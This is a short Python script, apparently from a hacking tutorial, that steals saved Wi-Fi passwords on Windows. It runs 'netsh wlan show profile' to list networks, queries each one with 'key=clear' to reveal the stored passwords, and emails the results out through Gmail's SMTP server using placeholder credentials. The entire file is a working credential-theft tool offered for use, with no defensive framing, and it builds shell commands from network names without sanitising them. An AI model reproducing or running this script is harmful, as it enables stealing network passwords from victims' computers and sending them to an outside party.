#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile  "
networks = str(subprocess.check_output(command, shell=True))
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""
try:
    for network_name in network_names_list:
        command = "netsh wlan show Profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result
except subprocess.CalledProcessError:
    pass

send_mail("gmail", "password", result)
